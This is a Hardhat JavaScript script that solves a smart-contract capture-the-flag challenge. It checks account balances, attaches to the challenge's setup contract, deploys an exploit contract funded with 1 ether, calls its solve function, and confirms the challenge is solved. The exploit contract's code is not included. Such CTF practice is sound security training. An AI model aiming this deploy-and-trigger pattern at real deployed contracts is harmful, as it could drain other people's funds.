// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  //const url = "https://ctf.sherlock.xyz/fJBgYRP8iYJ3bpQmBuXcKNO49EtEcHWn9Et2Bp0r_-0";
 // prov = ethers.getDefaultProvider();

  

  //get accounts and verify balances
  const accounts = await hre.ethers.getSigners();

  for (const account of accounts) {
    console.log(account.address);
    console.log(await account.getBalance());
  }

  //set addresses for current challenge
  const setupAddress = "0x76BB80b4F1bA62eD2665f537f605C3593daCc458";
  const challenge = "0x43c3E684cfCD27083f7156E7d883FC7e449e1c59";

  //attach setup
  const setupContract = await hre.ethers.getContractAt("SetupBackup", setupAddress);
  
  //verify unsolved
  console.log("Solved before ?: ", await setupContract.isSolved());
  console.log("Starting balance:", await ethers.provider.getBalance("0x43c3E684cfCD27083f7156E7d883FC7e449e1c59"));

  // deploy exploit contract
  const Exploit = await hre.ethers.getContractFactory("Exploit1");
  const exploit = await Exploit.deploy(challenge, { value: parseEther("1") });
  await exploit.deployed();
  console.log("Exploit deployed to:", exploit.address);
  //solve logic
  await exploit.solve({value: parseEther("1")});
  

  //verify solved
  console.log("Solved after?: ", await setupContract.isSolved());
  

  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
